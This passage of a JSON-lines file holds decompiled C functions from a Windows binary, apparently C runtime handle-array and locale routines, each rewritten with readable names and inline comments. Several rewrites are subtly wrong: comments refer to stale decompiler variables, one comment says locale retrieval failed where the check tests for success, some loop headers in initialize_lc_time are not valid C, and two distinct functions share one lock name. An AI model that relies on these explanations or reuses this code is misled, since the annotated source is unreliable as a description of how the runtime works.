0xffffffffffffffff) {\n                    destinationBuffer[destinationSize - 1] = L'\\0'; // Null-terminate the last character\n                    return 0x50; // Return error code for truncation\n                }\n                *destinationBuffer = L'\\0'; // Null-terminate destination\n                errorPointer = __doserrno(); // Get pointer to error number\n                errorCode = 0x22; // Set error code for buffer overflow\n                goto LAB_140019d00; // Jump to error handling\n            }\n            *destinationBuffer = L'\\0'; // Null-terminate destination if source is null\n        }\n    }\n    // If destination is null, handle error\n    if (destinationBuffer != (wchar_t *)0x0) goto LAB_140019d00; // Jump to error handling\n    errorPointer = __doserrno(); // Get pointer to error number\n    errorCode = 0x16; // Set error code for null pointer\nLAB_140019d00:\n    *errorPointer = errorCode; // Set the error number\n    FUN_14000ecf8(); // Call error handling function\n    return errorCode; // Return the error code\n}\n"}
{"Function Name": "__acrt_lowio_create_handle_array", "Address": "140019db8", "Source Code": "\nundefined8 * __acrt_lowio_create_handle_array(void)\n{\n    undefined8 *handleArray; // Pointer to the allocated memory for handle array\n    undefined1 *iterator; // Pointer for iterating through the array\n    undefined8 *originalMemoryAddress; // Pointer to store the original allocated memory address\n    undefined8 *currentHandle; // Pointer for initializing each handle in the array\n\n    // Allocate memory for 64 handles, each of size 72 bytes (0x48)\n    handleArray = (undefined8 *)_calloc_base(0x40, 0x48);\n    originalMemoryAddress = handleArray; // Store the base address of the allocated memory\n\n    // Check if memory allocation was successful and not equal to a specific address\n    if (handleArray != (undefined8 *)0x0 && handleArray != handleArray + 0x240) {\n        currentHandle = handleArray + 6; // Set pointer to the first handle in the array\n\n        // Loop to initialize each handle in the array\n        do {\n            // Initialize critical section for thread safety\n            __acrt_InitializeCriticalSectionEx((LPCRITICAL_SECTION)(currentHandle - 6), 4000, 0);\n            currentHandle[-1] = 0xffffffffffffffff; // Set a specific value for the previous element\n            iterator = (undefined1 *)((longlong)currentHandle + 0xe); // Pointer for zeroing out data\n            *currentHandle = 0; // Initialize the first element of the handle to 0\n            *(undefined4 *)(currentHandle + 1) = 0xa0a0000; // Set a specific value for the second element\n            *(undefined1 *)((longlong)currentHandle + 0xc) = 10; // Set a specific value for the third element\n            *(byte *)((longlong)currentHandle + 0xd) &= 0xf8; // Mask the fourth element\n\n            // Loop to zero out the next 5 bytes in the handle\n            for (uint i = 0; i < 5; i++) {\n                *iterator++ = 0; // Set each byte to 0\n            }\n            currentHandle += 9; // Move to the next handle in the array\n        } while (currentHandle != handleArray + 0x240); // Continue until all handles are initialized\n    }\n\n    // Free the allocated memory (though the pointer is not used here)\n    _free_base((LPVOID)0x0);\n    return originalMemoryAddress; // Return the pointer to the allocated handle array\n}\n"}
{"Function Name": "__acrt_lowio_destroy_handle_array", "Address": "140019e60", "Source Code": "\nvoid __acrt_lowio_destroy_handle_array(LPCRITICAL_SECTION criticalSectionArray)\n{\n    // Check if the provided critical section pointer is not null\n    if (criticalSectionArray != (LPCRITICAL_SECTION)0x0) {\n        LPCRITICAL_SECTION currentCriticalSection = criticalSectionArray; // Initialize a pointer to the critical section\n\n        // Check if the pointer is not equal to the end of the critical section array\n        if (criticalSectionArray != (LPCRITICAL_SECTION)&criticalSectionArray[0x73].LockCount) {\n            do {\n                DeleteCriticalSection(currentCriticalSection); // Delete the current critical section\n                currentCriticalSection++; // Move to the next critical section\n            } while (currentCriticalSection != (LPCRITICAL_SECTION)&criticalSectionArray[0x73].LockCount); // Continue until the end of the array is reached\n        }\n        _free_base(criticalSectionArray); // Free the memory allocated for the critical section array\n    }\n}\n"}
{"Function Name": "__acrt_lowio_ensure_fh_exists", "Address": "140019eb0", "Source Code": "\nlonglong __acrt_lowio_ensure_fh_exists(uint file_handle_index)\n{\n    longlong return_value = 0; // Initialize return value to 0\n    if (file_handle_index < 0x2000) { // Check if param_1 is less than 8192\n        __acrt_lock(7); // Acquire lock to ensure thread safety\n        int current_index = file_handle_count; // Get the current index for file handles\n        longlong handle_index = 0; // Initialize handle index\n        while (current_index <= (int)file_handle_index) { // Loop until the index exceeds param_1\n            if ((&handle_array)[handle_index] == 0) { // Check if the handle at index lVar5 is not allocated\n                undefined8 *new_handle = __acrt_lowio_create_handle_array(); // Create a new handle\n                (&handle_array)[handle_index] = new_handle; // Assign the new handle to the array\n                if (new_handle == (undefined8 *)0x0) { // Check if handle creation failed\n                    return_value = 0xc; // Set error code for failure\n                    break; // Exit the loop on failure\n                }\n                current_index = file_handle_count + 0x40; // Update the index for the next handle\n                file_handle_count = current_index; // Store the new index\n            }\n            handle_index++; // Increment the handle index\n        }\n        __acrt_unlock(7); // Release the lock\n    } else { // If param_1 is 8192 or greater\n        ulong *dos_error_pointer = __doserrno(); // Get the pointer to the DOS error number\n        *dos_error_pointer = 9; // Set the error number to 9 (invalid handle)\n        FUN_14000ecf8(); // Call error handling function\n        return_value = 9; // Set return value to 9 indicating an error\n    }\n    return return_value; // Return the result\n}\n"}
{"Function Name": "FID_conflict:__acrt_lowio_lock_fh", "Address": "140019f58", "Source Code": "\nvoid FID_conflict___acrt_lowio_lock_fh(uint file_handle_index)\n{\n    // Enter a critical section to ensure thread safety for the specified file handle\n    enter_critical_section((LPCRITICAL_SECTION)(&critical_section_array)[file_handle_index >> 6] + (file_handle_index & 0x3f) * 0x48);\n    return; // Exit the function\n}\n"}
{"Function Name": "FID_conflict:__acrt_lowio_lock_fh", "Address": "140019f80", "Source Code": "\nvoid FID_conflict___acrt_lowio_lock_fh(uint file_handle_index)\n{\n    // Leave the critical section associated with the file handle specified by param_1\n    LeaveCriticalSection((LPCRITICAL_SECTION)(&critical_section_array)[file_handle_index >> 6] + (file_handle_index & 0x3f) * 0x48);\n}\n"}
{"Function Name": "_free_osfhnd", "Address": "140019fa8", "Source Code": "\nint __cdecl _free_osfhnd(int file_handle)\n{\n    ulonglong index; // Variable to hold the calculated index\n    DWORD standard_handle; // Variable to hold the standard handle value\n\n    // Check if param_1 is a valid file handle\n    if ((-1 < file_handle) && ((uint)file_handle < DAT_14003a880)) {\n        index = (ulonglong)(file_handle & 0x3f); // Calculate the index for the handle array\n\n        // Check if the handle is valid and not marked as closed\n        if (((*(byte *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x38 + index * 0x48) & 1) != 0) &&\n            (*(longlong *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x28 + index * 0x48) != -1)) {\n            \n            // Check if the function FUN_14001338c returns 1\n            if (FUN_14001338c() == 1) {\n                // Set standard handle values based on param_1\n                if (file_handle == 0) {\n                    standard_handle = 0xfffffff6; // Standard input\n                } else if (file_handle == 1) {\n                    standard_handle = 0xfffffff5; // Standard output\n                } else if (file_handle == 2) {\n                    standard_handle = 0xfffffff4; // Standard error\n                } else {\n                    goto LAB_14001a028; // Go to cleanup if param_1 is not 0, 1, or 2\n                }\n                SetStdHandle(standard_handle, (HANDLE)0x0); // Set the standard handle to null\n            }\nLAB_14001a028:\n            // Mark the handle as invalid by setting it to -1\n            *(undefined8 *)((&DAT_14003a480)[(longlong)file_handle >> 6] + 0x28 + index * 0x48) = 0xffffffffffffffff;\n            return 0; // Return success\n        }\n    }\n\n    // Handle error case: set errno to 9 (invalid handle)\n    ulong *error_code_pointer = __doserrno();\n    *error_code_pointer = 9; // Set error code for invalid handle\n    error_code_pointer = __doserrno();\n    *error_code_pointer = 0; // Clear the error code\n    return -1; // Return failure\n}\n"}
{"Function Name": "_get_osfhandle", "Address": "14001a064", "Source Code": "\nintptr_t __cdecl _get_osfhandle(int file_handle)\n{\n    ulong *dos_error_pointer; // Pointer to store the address of the DOS error number\n\n    if (file_handle == -2) { // Check if the file handle is -2 (invalid handle)\n        dos_error_pointer = __doserrno(); // Get the address of the DOS error number\n        *dos_error_pointer = 9; // Set the error number to 9 (invalid handle)\n    } else {\n        // Check if the file handle is valid (non-negative and within a certain range)\n        if ((-1 < file_handle) && ((uint)file_handle < max_file_handle)) {\n            // Check if the specific bit is set in the corresponding structure\n            if ((*(byte *)((&file_handle_structure)[(longlong)file_handle >> 6] + 0x38 +\n                (ulonglong)(file_handle & 0x3f) * 0x48) & 1) != 0) {\n                // Return the corresponding OS file handle if the bit is set\n                return *(intptr_t *)((&file_handle_structure)[(longlong)file_handle >> 6] + 0x28 +\n                    (ulonglong)(file_handle & 0x3f) * 0x48);\n            }\n        }\n        dos_error_pointer = __doserrno(); // Get the address of the DOS error number\n        *dos_error_pointer = 9; // Set the error number to 9 (invalid handle)\n        handle_error_function(); // Call a function that may handle the error\n    }\n    return -1; // Return -1 to indicate failure\n}\n"}
{"Function Name": "__acrt_locale_free_monetary", "Address": "14001a0dc", "Source Code": "\nvoid __acrt_locale_free_monetary(longlong locale_pointer)\n{\n    // Check if the parameter is not null\n    if (locale_pointer != 0) {\n        // Loop through 12 iterations\n        for (int iteration = 0; iteration < 12; iteration++) {\n            // Retrieve a pointer from the monetary locale structure\n            undefined **locale_item = *(undefined **)(locale_pointer + 0x18 + iteration * 8);\n            // Check if the pointer is not equal to a predefined constant\n            if (locale_item != (undefined *)((longlong)PTR_DAT_1400380f8 + iteration * 8)) {\n                // Free the allocated memory if the pointer is different\n                _free_base(locale_item);\n            }\n        }\n    }\n}\n"}
{"Function Name": "FUN_14001a1e8", "Address": "14001a1e8", "Source Code": "\nundefined8 FUN_14001a1e8(longlong param_1)\n{\n    undefined **arrayPointer; // Pointer to an array of undefined type\n    undefined4 *undefined4Pointer = (undefined4 *)0x0; // Pointer to an undefined4 type, initialized to null\n    undefined **specificPointer; // Pointer to an array of undefined type\n    longlong localArray[2] = {param_1, 0}; // Local array to hold param_1 and a zero value\n\n    // Check if specific memory locations are both zero\n    if ((*(longlong *)(param_1 + 0x140) == 0) && (*(longlong *)(param_1 + 0x148) == 0)) {\n        arrayPointer = (undefined **)0x0; // Initialize ppuVar27 to null\n        specificPointer = &PTR_DAT_1400380e0; // Set ppuVar31 to a specific pointer\n\n    LAB_14001a6a7: // Label for goto statement\n        int *intPointer = *(int **)(param_1 + 0xf0); // Retrieve pointer from memory location\n        if (intPointer != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            *intPointer = *intPointer - 1; // Decrement the value pointed to by piVar3\n            UNLOCK(); // Release lock\n        }\n        intPointer = *(int **)(param_1 + 0xe0); // Retrieve another pointer from a different memory location\n        if (intPointer != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            int intValue = *intPointer; // Store the value pointed to by piVar3\n            *intPointer = *intPointer - 1; // Decrement the value pointed to by piVar3\n            UNLOCK(); // Release lock\n            if (intValue == 1) { // Check if the original value was 1\n                _free_base(*(LPVOID *)(param_1 + 0xf8)); // Free memory at a specific location\n                _free_base(*(LPVOID *)(param_1 + 0xe0)); // Free memory at another location\n            }\n        }\n        *(undefined4 **)(param_1 + 0xf0) = undefined4Pointer; // Set memory location to puVar28\n        *(undefined ***)(param_1 + 0xe0) = arrayPointer; // Set memory location to ppuVar27\n        *(undefined ***)(param_1 + 0xf8) = specificPointer; // Set memory location to ppuVar31\n        return 0; // Return 0\n    } else {\n        specificPointer = (undefined **)_calloc_base(1, 0x98); // Allocate memory for ppuVar31\n        _free_base((LPVOID)0x0); // Free null pointer (no operation)\n        if (specificPointer != (undefined **)0x0) { // Check if memory allocation was successful\n            arrayPointer = (undefined **)_calloc_base(1, 4); // Allocate memory for ppuVar27\n            _free_base((LPVOID)0x0); // Free null pointer (no operation)\n            if (arrayPointer != (undefined **)0x0) { // Check if memory allocation was successful\n                if (*(longlong *)(param_1 + 0x140) == 0) { // Check if specific memory location is zero\n                    // Initialize ppuVar31 with specific pointers\n                    *specificPointer = PTR_DAT_1400380e0;\n                    specificPointer[1] = PTR_DAT_1400380e8;\n                    specificPointer[2] = PTR_DAT_1400380f0;\n                    specificPointer[3] = PTR_DAT_1400380f8;\n                    specificPointer[4] = PTR_DAT_140038100;\n                    specificPointer[5] = PTR_DAT_140038108;\n                    specificPointer[6] = PTR_DAT_140038110;\n                    specificPointer[7] = PTR_DAT_140038118;\n                    specificPointer[8] = PTR_DAT_140038120;\n                    specificPointer[9] = PTR_DAT_140038128;\n                    specificPointer[10] = _DAT_140038130;\n                    specificPointer[0xb] = PTR_DAT_140038138;\n                    specificPointer[0xc] = PTR_DAT_140038140;\n                    specificPointer[0xd] = PTR_DAT_140038148;\n                    specificPointer[0xe] = PTR_DAT_140038150;\n                    specificPointer[0xf] = PTR_DAT_140038158;\n                    specificPointer[0x10] = PTR_DAT_140038160;\n                    specificPointer[0x11] = PTR_DAT_140038168;\n                    specificPointer[0x12] = PTR_DAT_140038170;\n                } else {\n                    undefined4Pointer = (undefined4 *)_calloc_base(1, 4); // Allocate memory for puVar28\n                    _free_base((LPVOID)0x0); // Free null pointer (no operation)\n                    if (undefined4Pointer == (undefined4 *)0x0) { // Check if memory allocation failed\n                        _free_base(specificPointer); // Free ppuVar31\n                        specificPointer = arrayPointer; // Assign ppuVar27 to ppuVar31\n                        goto LAB_14001a281; // Jump to cleanup label\n                    }\n                    wchar_t *wideCharPointer = *(wchar_t **)(param_1 + 0x140); // Retrieve wide character pointer\n                    for (int loopIndex = 0x15; loopIndex <= 0x57; loopIndex++) { // Loop through a range of values\n                        __acrt_GetLocaleInfoA((__crt_locale_pointers *)localArray, (loopIndex < 0x50) ? 1 : 2, wideCharPointer, loopIndex, (longlong *)(specificPointer + (loopIndex - 0x15))); // Get locale info\n                    }\n                    // Check if specific elements in ppuVar31 are non-zero\n                    if (specificPointer[0xe] != 0 || specificPointer[0x10] != 0 || specificPointer[0x11] != 0 || specificPointer[0x12] != 0) {\n                        __acrt_locale_free_monetary((longlong)specificPointer); // Free monetary locale info\n                        _free_base(specificPointer); // Free ppuVar31\n                        _free_base(arrayPointer); // Free ppuVar27\n                        _free_base(undefined4Pointer); // Free puVar28\n                        return 1; // Return 1 on error\n                    }\n                    byte *byteArrayPointer = specificPointer[7]; // Get pointer to byte array\n                    while (*byteArrayPointer != 0) { // Loop until null terminator\n                        if ((byte)(*byteArrayPointer - 0x30) < 10) { // Check if character is a digit\n                            *byteArrayPointer -= 0x30; // Convert ASCII digit to integer\n                        } else if (*byteArrayPointer == 0x3b) { // Check for semicolon character\n                            do {\n                                *byteArrayPointer = byteArrayPointer[1]; // Shift characters left\n                                byteArrayPointer++; // Move to next character\n                            } while (*byteArrayPointer != 0); // Continue until null terminator\n                        }\n                        byteArrayPointer++; // Move to next character\n                    }\n                }\n            }\n            *specificPointer = (undefined *)**(undefined8 **)(param_1 + 0xf8); // Set first element of ppuVar31\n            specificPointer[1] = *(undefined **)(*(longlong *)(param_1 + 0xf8) + 8); // Set second element of ppuVar31\n            specificPointer[2] = *(undefined **)(*(longlong *)(param_1 + 0xf8) + 0x10); // Set third element of ppuVar31\n            specificPointer[0xb] = *(undefined **)(*(longlong *)(param_1 + 0xf8) + 0x58); // Set 12th element of ppuVar31\n            specificPointer[0xc] = *(undefined **)(*(longlong *)(param_1 + 0xf8) + 0x60); // Set 13th element of ppuVar31\n            *(undefined4 *)arrayPointer = 1; // Set first element of ppuVar27 to 1\n            if (undefined4Pointer != (undefined4 *)0x0) { // Check if puVar28 is not null\n                *undefined4Pointer = 1; // Set value pointed to by puVar28 to 1\n            }\n            goto LAB_14001a6a7; // Jump to processing label\n        }\n    LAB_14001a281: // Cleanup label\n        _free_base(specificPointer); // Free ppuVar31\n    }\n    return 1; // Return 1\n}\n"}
{"Function Name": "__acrt_locale_free_numeric", "Address": "14001a71c", "Source Code": "\nvoid __acrt_locale_free_numeric(longlong *locale_pointer)\n{\n    // Check if the input pointer is not null\n    if (locale_pointer != (longlong *)0x0) {\n        // Loop through the first 5 elements of the array pointed to by param_1\n        for (int index = 0; index < 5; index++) {\n            // Check if the current element is not equal to the expected pointer value\n            if ((undefined *)locale_pointer[index] != PTR_DAT_1400380e0 + index * 8) {\n                // Free the memory pointed to by the current element\n                _free_base((undefined *)locale_pointer[index]);\n            }\n        }\n    }\n}\n"}
{"Function Name": "FUN_14001a788", "Address": "14001a788", "Source Code": "\nundefined8 FUN_14001a788(longlong param_1)\n{\n    longlong *longPtr; // Pointer to longlong\n    wchar_t *wideCharPtr; // Pointer to wide character\n    int *intPtr; // Pointer to integer\n    undefined *undefinedPtr; // Pointer to undefined type\n    int intValue1; // Integer variable\n    int intValue2; // Integer variable\n    int intValue3; // Integer variable\n    int intValue4; // Integer variable\n    int intValue5; // Integer variable\n    undefined **undefinedPtr1; // Pointer to pointer of undefined type\n    undefined **undefinedPtr2; // Pointer to pointer of undefined type\n    byte *bytePtr1; // Pointer to byte\n    byte *bytePtr2; // Pointer to byte\n    undefined8 returnValue; // Undefined 8-bit variable\n    longlong localArray[2] = {param_1, 0}; // Local array initialized with param_1 and 0\n\n    // Check if certain memory locations are zero\n    if ((*(longlong *)(param_1 + 0x148) == 0) && (*(longlong *)(param_1 + 0x140) == 0)) {\n        undefinedPtr2 = &PTR_DAT_1400380e0; // Set ppuVar14 to a specific pointer\n        undefinedPtr1 = (undefined **)0x0; // Initialize ppuVar11 to null\n    LAB_14001a9fc: // Label for goto statement\n        intPtr = *(int **)(param_1 + 0xe8); // Get pointer to integer from memory\n        if (intPtr != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            *intPtr = *intPtr - 1; // Decrement the integer value\n            UNLOCK(); // Release lock\n        }\n        intPtr = *(int **)(param_1 + 0xe0); // Get another pointer to integer\n        if (intPtr != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            intValue1 = *intPtr; // Store the current value\n            *intPtr = *intPtr - 1; // Decrement the integer value\n            UNLOCK(); // Release lock\n            if (intValue1 == 1) { // Check if the previous value was 1\n                _free_base(*(LPVOID *)(param_1 + 0xe0)); // Free memory at the specified location\n                _free_base(*(LPVOID *)(param_1 + 0xf8)); // Free another memory location\n            }\n        }\n        *(undefined ***)(param_1 + 0xe8) = undefinedPtr1; // Set memory location to ppuVar11\n        returnValue = 0; // Set return value to 0\n        *(undefined ***)(param_1 + 0xe0) = undefinedPtr1; // Set another memory location to ppuVar11\n        *(undefined ***)(param_1 + 0xf8) = undefinedPtr2; // Set another memory location to ppuVar14\n    } else {\n        returnValue = 1; // Set return value to 1\n        undefinedPtr2 = (undefined **)_calloc_base(1, 0x98); // Allocate memory for ppuVar14\n        if (undefinedPtr2 == (undefined **)0x0) { // Check if allocation failed\n            return 1; // Return 1 on failure\n        }\n        longPtr = *(longlong **)(param_1 + 0xf8); // Get pointer to longlong from memory\n        for (int i = 0; i < 14; i++) { // Loop through 14 elements\n            undefinedPtr2[i] = (undefined *)longPtr[i * 2]; // Assign values from plVar2 to ppuVar14\n        }\n        undefinedPtr1 = (undefined **)_malloc_base(4); // Allocate memory for ppuVar11\n        _free_base((LPVOID)0x0); // Free null pointer (no-op)\n        if (undefinedPtr1 != (undefined **)0x0) { // Check if allocation succeeded\n            *(undefined4 *)undefinedPtr1 = 0; // Initialize allocated memory to 0\n            if (*(longlong *)(param_1 + 0x148) == 0) { // Check if a specific memory location is zero\n                undefinedPtr2[0] = PTR_DAT_1400380e0; // Set values in ppuVar14\n                undefinedPtr2[1] = PTR_DAT_1400380e8; // Set values in ppuVar14\n                undefinedPtr2[2] = PTR_DAT_1400380f0; // Set values in ppuVar14\n                undefinedPtr2[0xb] = PTR_DAT_140038138; // Set values in ppuVar14\n                undefinedPtr2[0xc] = PTR_DAT_140038140; // Set values in ppuVar14\n                *(undefined4 *)undefinedPtr1 = 1; // Set value in ppuVar11\n                if (undefinedPtr1 != (undefined **)0x0) { // Check if ppuVar11 is not null\n                    *(undefined4 *)undefinedPtr1 = 1; // Set value in ppuVar11\n                }\n                goto LAB_14001a9fc; // Jump to label\n            }\n            undefinedPtr1 = (undefined **)_malloc_base(4); // Allocate memory for ppuVar11 again\n            _free_base((LPVOID)0x0); // Free null pointer (no-op)\n            if (undefinedPtr1 == (undefined **)0x0) { // Check if allocation failed\n                _free_base(undefinedPtr2); // Free ppuVar14\n                undefinedPtr2 = undefinedPtr1; // Set ppuVar14 to ppuVar11\n            } else {\n                *(undefined4 *)undefinedPtr1 = 0; // Initialize allocated memory to 0\n                wideCharPtr = *(wchar_t **)(param_1 + 0x148); // Get pointer to wide character\n                // Get locale information and store in ppuVar14\n                intValue1 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)localArray, 1, wideCharPtr, 0xe, (longlong *)undefinedPtr2);\n                intValue2 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)localArray, 1, wideCharPtr, 0xf, (longlong *)(undefinedPtr2 + 1));\n                intValue3 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)localArray, 1, wideCharPtr, 0x10, (longlong *)(undefinedPtr2 + 2));\n                intValue4 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)localArray, 2, wideCharPtr, 0xe, (longlong *)(undefinedPtr2 + 0xb));\n                intValue5 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)localArray, 2, wideCharPtr, 0xf, (longlong *)(undefinedPtr2 + 0xc));\n                // Check if all locale info retrievals failed\n                if (intValue5 == 0 && (((intValue1 == 0 && intValue2 == 0) && intValue3 == 0) && intValue4 == 0)) {\n                    bytePtr1 = undefinedPtr2[2]; // Get pointer to byte from ppuVar14\n                    while (*bytePtr1 != 0) { // Loop until null terminator\n                        if ((*bytePtr1 - 0x30) < 10) { // Check if byte is a digit\n                            *bytePtr1 -= 0x30; // Convert ASCII digit to integer\n                        } else {\n                            bytePtr2 = bytePtr1; // Set pbVar15 to current byte pointer\n                            if (*bytePtr1 != 0x3b) { // Check for specific character\n                                bytePtr1++; // Move to next byte\n                                continue; // Continue loop\n                            }\n                            do {\n                                *bytePtr2 = bytePtr2[1]; // Shift bytes left\n                                bytePtr2++; // Move to next byte\n                            } while (*bytePtr2 != 0); // Continue until null terminator\n                        }\n                        bytePtr1++; // Move to next byte\n                    }\n                    goto LAB_14001a9f0; // Jump to label\n                }\n                __acrt_locale_free_numeric((longlong *)undefinedPtr2); // Free locale numeric data\n                _free_base(undefinedPtr2); // Free ppuVar14\n                _free_base(undefinedPtr1); // Free ppuVar11\n                returnValue = 0xffffffff; // Set return value to error code\n                undefinedPtr2 = undefinedPtr1; // Set ppuVar14 to ppuVar11\n            }\n        }\n    }\n    _free_base(undefinedPtr2); // Free ppuVar14\n    return returnValue; // Return the result\n}\n"}
{"Function Name": "free_crt_array_internal", "Address": "14001aa70", "Source Code": "\nvoid __cdecl free_crt_array_internal(void **array_ptr, __uint64 array_size)\n{\n    // Extract the lower 61 bits of param_2\n    ulonglong lower_bits = array_size & 0x1fffffffffffffff;\n\n    // Check if the pointer arithmetic results in an overflow\n    if (array_ptr + array_size < array_ptr) {\n        lower_bits = 0; // Set uVar1 to 0 if overflow occurs\n    }\n\n    // Loop through the array and free each element\n    for (ulonglong index = 0; index != lower_bits; index++) {\n        _free_base(*array_ptr++); // Free the memory pointed to by param_1 and increment the pointer\n    }\n}\n"}
{"Function Name": "initialize_lc_time", "Address": "14001aac8", "Source Code": "\nbool __cdecl initialize_lc_time(__crt_lc_time_data *param_1, __crt_locale_data *param_2)\n{\n    undefined1 (*localeArray)[32]; // Pointer to an array of 32 undefined1 elements\n    uint localeInfoDay1, localeInfoDay2, localeInfoMonth1, localeInfoMonth2, combinedLocaleInfo = 0; // Variables for locale information retrieval\n    longlong loopCounter; // Variable for loop control\n    __crt_lc_time_data *localeTimeData; // Pointer to locale time data\n\n    // Get the locale name from the locale data\n    localeArray = *(undefined1 (**) [32])(param_2 + 0x150);\n    *(wchar_t **)(param_1 + 0x2b8) = __acrt_copy_locale_name(localeArray);\n    \n    // Loop to retrieve locale information for days of the week\n    for (uint currentIndex = 0x31, loopCounter = 7; loopCounter != 0; currentIndex++, loopCounter--) {\n        localeTimeData = param_1 + (ulonglong)((currentIndex - 0x30) % 7) * 8; // Calculate pointer offset for each day\n        // Retrieve locale information for the current day and store it\n        localeInfoDay1 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, currentIndex, (longlong *)localeTimeData);\n        localeInfoDay2 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, currentIndex - 7, (longlong *)(localeTimeData + 0x38));\n        localeInfoMonth1 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, currentIndex, (longlong *)(localeTimeData + 0x160));\n        localeInfoMonth2 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, currentIndex - 7, (longlong *)(localeTimeData + 0x198));\n        combinedLocaleInfo |= localeInfoDay1 | localeInfoDay2 | localeInfoMonth1 | localeInfoMonth2; // Combine the results into uVar18\n    }\n\n    // Loop to retrieve locale information for months\n    for (uint currentIndex = 0x38, loopCounter = 0xc, localeTimeData = param_1 + 0xd0; loopCounter != 0; currentIndex++, loopCounter--) {\n        // Retrieve locale information for the current month and store it\n        localeInfoDay1 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, currentIndex + 0xc, (longlong *)(localeTimeData + -0x60));\n        localeInfoDay2 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, currentIndex, (longlong *)localeTimeData);\n        localeInfoMonth1 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, currentIndex + 0xc, (longlong *)(localeTimeData + 0x100));\n        localeInfoMonth2 = __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, currentIndex, (longlong *)(localeTimeData + 0x160));\n        combinedLocaleInfo |= localeInfoDay1 | localeInfoDay2 | localeInfoMonth1 | localeInfoMonth2; // Combine the results into uVar18\n        localeTimeData += 8; // Move to the next month data\n    }\n\n    // Final checks for specific locale information retrieval\n    return __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, 0x28, (longlong *)(param_1 + 0x130)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, 0x29, (longlong *)(param_1 + 0x138)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, 0x28, (longlong *)(param_1 + 0x290)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, 0x29, (longlong *)(param_1 + 0x298)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, 0x1f, (longlong *)(param_1 + 0x140)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, 0x20, (longlong *)(param_1 + 0x148)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 1, (wchar_t *)localeArray, 0x1003, (longlong *)(param_1 + 0x150)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 0, (wchar_t *)localeArray, 0x1009, (longlong *)(param_1 + 0x158)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, 0x1f, (longlong *)(param_1 + 0x2a0)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, 0x20, (longlong *)(param_1 + 0x2a8)) == 0 &&\n           __acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_2, 2, (wchar_t *)localeArray, 0x1003, (longlong *)(param_1 + 0x2b0)) == 0 &&\n           combinedLocaleInfo == 0; // Ensure no errors occurred during locale information retrieval\n}\n"}
{"Function Name": "__acrt_locale_free_time", "Address": "14001ae08", "Source Code": "\nvoid __acrt_locale_free_time(void **locale_params)\n{\n    // Check if the input parameter is not a null pointer\n    if (locale_params != (void **)0x0) {\n        // Free the first array of 7 elements\n        free_crt_array_internal(locale_params, 7);\n        // Free the second array of 7 elements, starting from the 8th element\n        free_crt_array_internal(locale_params + 7, 7);\n        // Free the third array of 12 elements, starting from the 14th element\n        free_crt_array_internal(locale_params + 0xe, 0xc);\n        // Free the fourth array of 12 elements, starting from the 26th element\n        free_crt_array_internal(locale_params + 0x1a, 0xc);\n        // Free the fifth array of 2 elements, starting from the 38th element\n        free_crt_array_internal(locale_params + 0x26, 2);\n        // Free the base pointer at the 40th element\n        _free_base(locale_params[0x28]);\n        // Free the base pointer at the 41st element\n        _free_base(locale_params[0x29]);\n        // Free the base pointer at the 42nd element\n        _free_base(locale_params[0x2a]);\n        // Free the sixth array of 7 elements, starting from the 44th element\n        free_crt_array_internal(locale_params + 0x2c, 7);\n        // Free the seventh array of 7 elements, starting from the 51st element\n        free_crt_array_internal(locale_params + 0x33, 7);\n        // Free the eighth array of 12 elements, starting from the 58th element\n        free_crt_array_internal(locale_params + 0x3a, 0xc);\n        // Free the ninth array of 12 elements, starting from the 70th element\n        free_crt_array_internal(locale_params + 0x46, 0xc);\n        // Free the tenth array of 2 elements, starting from the 82nd element\n        free_crt_array_internal(locale_params + 0x52, 2);\n        // Free the base pointer at the 84th element\n        _free_base(locale_params[0x54]);\n        // Free the base pointer at the 85th element\n        _free_base(locale_params[0x55]);\n        // Free the base pointer at the 86th element\n        _free_base(locale_params[0x56]);\n        // Free the base pointer at the 87th element\n        _free_base(locale_params[0x57]);\n    }\n}\n"}
